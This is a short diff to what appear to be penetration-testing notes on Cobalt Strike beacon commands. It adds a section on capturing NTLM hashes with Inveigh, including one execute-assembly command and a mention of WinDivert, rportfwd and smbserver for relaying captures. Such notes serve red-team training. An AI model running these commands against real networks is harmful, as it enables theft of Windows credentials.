@@ -118,3 +118,17 @@ beacon> jobs
 beacon> jobkill 0
 beacon> kill 1240
 ```
+
+# NTLM Capturing
+
+We can use `Inveigh` to listen to incoming requests, similar to `Responder` but in .NET.
+
+* [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+`Inveigh` should be run as a local admin.
+
+```
+beacon> execute-assembly C:\Tools\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
+```
+
+It it also possible use the WinDivert, rportfwd and smbserver to capture the NetTLMHash.
